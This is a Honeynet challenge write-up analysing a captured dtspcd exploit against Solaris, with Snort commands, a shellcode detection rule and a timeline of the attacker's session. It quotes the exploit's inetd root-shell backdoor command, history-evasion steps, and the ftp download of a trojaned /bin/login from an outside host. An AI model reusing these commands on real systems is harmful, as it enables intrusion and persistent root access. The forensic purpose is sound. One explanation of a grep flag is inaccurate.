@@ -1,0 +1,365 @@
+					Preparation
+
+I downloaded the file from the project.honeynet.org web site and verified 
+the integrity of it and then uncompressed it:
+
+	# wget http://project.honeynet.org/scans/scan20/0108@000-snort.log.tar.gz 
+	# md5sum scan20.tar.gz
+	  612be364f54ca5fcb47cf70e69419175  0108@000-snort.log.tar.gz 
+	# gzip -d 0108@000-snort.log.tar.gz 
+	# tar -xvf 0108@000-snort.log.tar
+
+I then created the following directories to store the output from snort:
+
+	/scan20/scans
+	/scan20/sessions
+
+I ran snort twice on the 0108@000-snort.dmp log file. One time to extract 
+session output and once for attack information. For the session output 
+I ran snort as follows:
+
+	#snort -dr 0108@000-snort.dmp -c snort_session.conf -l ./scan20 \
+	> /sessions
+
+and I ran snort as follows for attack output:
+
+	#snort -vdr 0108@000-snort.dmp -c snort_attacks.conf -l ./scan20 \
+	> /scans >>./scans/attacks.txt
+
+
+	
+					Analysis
+
+========================================================================
+1. What is a NOP slide, and how is this one different from the NOP slide 
+   in the rpc.statd exploit in Scan10?
+========================================================================
+
+A buffer overflow works by putting more information in the buffer than 
+was reserved for that piece of data. The buffer overflow code will write 
+over the memory stack so that return address in the original code is 
+overwritten with an address that lies somewhere in the NOPs. Since the 
+NOPs essentially do nothing they will continue to execute until the code 
+that does something (i.e portbinding shellcode) is run. When writing an 
+exploit the attacker realizes that not every system is going to be the 
+same as his/hers so he/she must take into account unknown variables, to 
+a degree. Since the memory ranges that the applications will run in will 
+depend on different variables the attacker uses enough NOPs in the 
+beginning of the code so that they can make an accurate guess (yes, I 
+know it's an oxymoron)of where to put the return address that will be 
+used in the buffer overflow code. The amount of NOPs that can be used 
+will depend on how much memory (space) that can be exploited and the 
+amount of that space that will contain the code that is of actual use 
+(in a lot of cases this is just a piece of port binding shellcode).
+
+One of the differences between the rpc.statd exploit and the dstpcd 
+exploit is that the rpc.statd exploit is not your usual buffer 
+overflow. It is more of a print formatting exploit. The attacker can 
+pass data for the print function to send to the syslog process and 
+have it overwrite the return address. In this case the attacked 
+focused on the vsnprintf function. This print function prints to a 
+string while checking va_arg for the length.  I this case the va_arg 
+is wiped. The other difference is that since the chip architecture is 
+different the NOP code is different. You also have issues with big 
+endian and little endian.
+
+The va_arg (rpc.statd) and the variable that copies the client data 
+(dstpcd) are exploited differently. In the rpc.statd the va_arg is 
+completly wiped. The varable (dstpcd) that copies the client data 
+is not wiped. It does not check to see how much data that the client 
+wants to send. Since the internal buffer is only 0x1000H and the 
+attacker sends 0x0103e the last 0x3e will overwrite the memory after 
+the 0x1000H buffer.
+
+=================================================================
+2. The attack was on 08 Jan, 2002. Would Snort have generated an 
+alert then for the attack? 
+=================================================================
+
+Yes it would have been detected. The following rule would have 
+caught it:
+
+	alert ip $EXTERNAL_NET any -> $HOME_NET any (msg:"SHELLCODE 
+	sparc NOOP"; content:"|801c 4011 801c 4011 801c 4011 801c 4011|"; 
+	reference:arachnids, 353; classtype: shellcode-detect; sid:645; 
+	rev:2;)
+
+This would have detected it as a generic sparc shellcode. Many new 
+attacks will get detected by rules that looks for things that are 
+generic enough, like a lot of NOP codes or the string "/bin/sh". 
+This can produce false positives, but this is where the level of 
+knowledge of the analyst comes into account.
+
+===================================================================
+3. In the exploit code, the command "/bin/sh sh -i" is given, what 
+is its purpose, and why is 'sh' shown twice? 
+===================================================================
+
+This commands would be executed as follows (I have seperated the 
+commands based on the ";" since this is how the shell would have 
+interpreted it.)
+
+	/bin/ksh -c  echo "ingreslock stream tcp nowait root \
+	> /bin/sh sh -i" >>/tmp/x
+	/usr/sbin/inetd -s /tmp/x
+	sleep 10
+	/bin/rm -f /tmp/x
+
+The first line executes "/bin/ksh -c" which tells the Korn shell 
+to execute the following command(s) and then exit after it is 
+completed. The command that it executes is the "echo" command. 
+This command usually is used in scripts to output information 
+to the screen, but in this case it is going to "echo" the output 
+but the ">>" tells the shell to redirect STOUT to the file "/tmp/x". 
+The information that is going to be entered into the file is 
+"ingreslock stream tcp nowait root /bin/sh sh -i". 
+
+The second line starts "inetd" in standalone and uses the "/tmp/x"
+as the file for the configuration.
+
+The third line waits for 10 seconds before executing line 4. This 
+is put there to make sure that there is enough time for "inetd" to 
+start the "/tmp/x" process.
+
+The fourth line forcefully removes the "/tmp/x" file. 
+
+The information in "/tmp/x", when started by "inetd", will open 
+TCP port 1524. When an attack connects to this port via telnet 
+he/she will will get an interactive shell with root permissions. 
+If the attacker did not have the "sh -i" the port would still be 
+opened but the attacker could not attach to it interactively. 
+
+=============================================================
+4. The attacker executed a variety of commands on the hacked 
+Solaris box. Which commands were automated by the exploit, 
+which commands were manual by the attacker himself? 
+=============================================================
+(All of the following information was taken from the attacks.txt 
+file.) 
+From looking at some of the times between commands it does 
+look like some of the attack was automated in some way. The 
+attacker could have automated a lot more of the attack. It seems 
+that when something had to get done properly the attacker used a 
+script. The commands that the attacker entered in manually, other 
+than the ftp commands, did not do anything major. Other than the 
+ftp commands it looks like the attacker only entered in the "w" 
+and "ls" command manually.
+
+/*Start of conversation. This is the time of the first SYN packet.*/ 
+	
+	01/08-09:45:53.426133		
+
+/*First buffer overflow packet is sent.*/ 
+
+	01/08-09:46:04.378306
+
+/*Attacker logs into the remote shell listening on TCP port 1524 
+and executes the following commands.*/ 
+This looks like the attacker could have entered it in by had. 
+There is almost 14 seconds between the first buffer overflow 
+and the following commands. (I seperated the commands based on 
+the ";" character, just as the shell would have.)
+
+	01/08-09:46:18.398427	uname -a;ls -l /core \
+				> /var/dt/tmp/DTSPCD.log;
+				PATH=/usr/local/bin:/usr/bin:/bin: \ 
+				> /usr/sbin:/sbin:/usr/ccs/bin:/usr/gnu/bin;
+				export PATH;
+				echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'| \
+				> grep -v grep|awk '{print $2}'`
+
+/*Attacker sends the "w" command.*/
+This command is entered by hand from the attacker. This command 
+comes almost four seconds after his/her last set of commands.
+
+	01/08-09:46:22.262598	w
+
+/*Attacker sends the following command.*/
+This command looks like the start of a script. While is happens 
+about 27 seconds after the last set of command the following two 
+packet happen within short amount of time.
+
+	01/08-09:46:49.655454	unset HISTFILE
+
+/*Attacker sends the following command.*/
+These command come very quick after the previous set command. The 
+other interesting thing is that the commands are sent in one packet. 
+The reason that this is interesting is that the attacker issues two 
+seperate commands, but they are not seperated by a ";". They are 
+seperated by a newline character(ACSII == \n , HEX ==0x0A). From 
+observing the other packets each command that is issued is terminated 
+by a newline character. Normally this would be at the end of a set 
+of commands after the attacker hits "enter/return". This supports my 
+assumptions of this being scripted.
+
+	01/08-09:46:49.740975	cd /tmp
+					mkdir /usr/lib
+
+/*Attacker sends the following command.*/
+This command is also part of a script. 
+
+	01/08-09:46:50.317787	mv /bin/login /usr/lib/libfl.k
+
+/*Attacker ftp's to get trojans.*/
+This command is issued about nine seconds after the last command so 
+I am assuming that it is the attacker entered this command by hand.
+
+	01/08-09:46:59.669894	ftp 64.224.118.115
+
+/*Attacker enters user name.*/
+This command looks to be entered in manually by the attacker also.
+
+	01/08-09:47:04.152716	ftp
+
+/*Attacker enters in password.*/
+Even though this command and the previous command are issued in a 
+very short amount of time this could be done very quickly as it is 
+only a username and password.
+
+	01/08-09:47:05.973543	a@
+
+/*Attacker changes directory on ftp server.*/
+This command is issued by the attacker manually also.
+
+	01/08-09:47:08.590251	cd pub
+
+/*Attacker sets type to binary.*/
+This command is also manually entered by the attacker.
+	
+	01/08-09:47:10.001416	binary
+
+/*Attacker sends command to start download of trojan.*/
+This command is manually entered by the attacker.
+
+	01/08-09:47:11.970275	get sun1
+
+/*Attacker types in the following command.*/
+This command is manually entered by the attacker.
+
+	01/08-09:47:13.020046	bye
+
+/*Attacker hits "enter" key.*/
+The attacker probably did not see anything new on the screen so 
+he/she hit enter.
+
+	01/08-09:47:30.599138 	(enter)
+
+/*Attacker enters in "ls" command.*/
+This command is short and could be entered by the attacker in the 
+amount of time from the last command .
+
+	01/08-09:47:31.546443	ls
+
+/*Attacker enters the following command.*/
+While this command is entered about six seconds after the previous 
+command, the nextcommand that is entered is less than one second 
+after this one. I would say that this command is the first part of 
+the script.
+
+	01/08-09:47:37.680413	chmod 555 sun1
+
+/*Attacker enters the following commands.*/
+By looking at the time between the last command and this one I 
+would say that these two command are scripted.
+
+	01/08-09:47:38.460464	mv sun1 /bin/login
+
+/*Attacker test's out trojan "login" file. This is done from a 
+different IP address (66.156.236.56).*/
+The attacker ftp's to the server and attempts to login.
+
+	01/08-09:47:50.350643	
+
+======================================
+5. What is sun1, and how does it work?
+======================================
+
+The "sun1" replaces "/bin/login". Doing a "strings" on sun1 and 
+the "/usr/login" file on a Solaris8 box shows some interesting 
+differences. At first I thought that the trojaned login hid
+logins from the attacker because it did not make reference to
+"/var/adm/lastlog" or "/var/adm/wtmpx" like the real /bin/login
+does. Then I did a "truss -t open" on both the real "login" and the 
+trojaned login and I did not see any difference. I noticed that
+the trojaned login runs the real "/bin/login". Then since the
+"open's" were the same I did a "truss" on both files. This 
+did not show any major differences. After looking into this 
+file I am not sure what it does. It appears as if it does nothing
+but trick the attack into thinking that he/she has a backdoor into
+the system that will go unlogged.
+
+
+=========================================
+6. What did you learn from this exercise?
+=========================================
+
+I need to start looking more closely at the packet decodes. I did not 
+notice the newline character right away. There are some characters that 
+need to be memorized so that when I look at the hex decode I can see 
+them quickly. I see that many attackers just want to get in and get 
+out. They seem to be attacking a system but not knowing what they want 
+on the system. After working on finding out what "sun1" does it seems
+as thought the attackers just download and run anything that says that
+it is good, even if they can't verify that it really does the job.
+
+========================================
+7. How long did this challenge take you?
+========================================
+
+I spent about 7 hours total on this challange. I spent about 2 hours 
+finding out what the "sh -i" was used for. I saw a lot of expliots 
+using it, but I could not find out what it was used for. After setting 
+up a Solaris box up and actually doing it did I find out. I spent about 
+one hour in the time line analysis of the attackers commands and 
+corrilating the packets. I spent about two hours trying to find the 
+difference between the rpc.statd exploit and the dtspcd exploit. I spent 
+2 hours doing the preparation and writing the final analysis.
+===================================================================
+Bonus:
+One of the commands executed during the attack is 
+	
+	echo "BD PID(s): "`ps -fed|grep ' -s /tmp/x'|grep -v grep \
+	> |awk '{print $2}'` 
+
+What is the purpose of this command and what does 'BD' stand for? 
+===================================================================
+
+The BD stands for back door. The command line that the attacker entered 
+would give him/her the PID of the "/tmp/x" file.
+
+The fist part (echo "BD PID(s): ") just echo's to the screen 
+
+	BD PID(s):
+
+The second part goes as follows:
+	
+ps -fed	
+	/*From the "ps" man page: -e => List information about every process 
+				        now running.
+			              -f => Generate a full listing.
+			              -d => List information about all processes
+						  except session leaders.
+
+	The output from this is sent to the next command.*/	
+
+
+grep '-s  /tmp/x'
+	/*From the "grep" man page: -s => Supress error messages about 
+				          nonexistent or unreadable files.
+
+	grep is seaching for the pattern "/tmp/x". If will sent this output 
+	to the next command. This output will not only include the "/tmp/x" 
+	process that is running in memory, but it will also find the current 
+	grep proccess.*/
+
+grep -v grep
+	/*From the "grep" man page: -v => Print all lines except those that 
+	contain the pattern. This will get rid of the "grep '-s /tmp/x'" 
+	output that was found in the previous command.*/
+	
+awk '{print $2}'
+	/*This will take the output from the previous command and print the 
+	second column.This will be the PID of the trojaned process.*/	
+
+
+
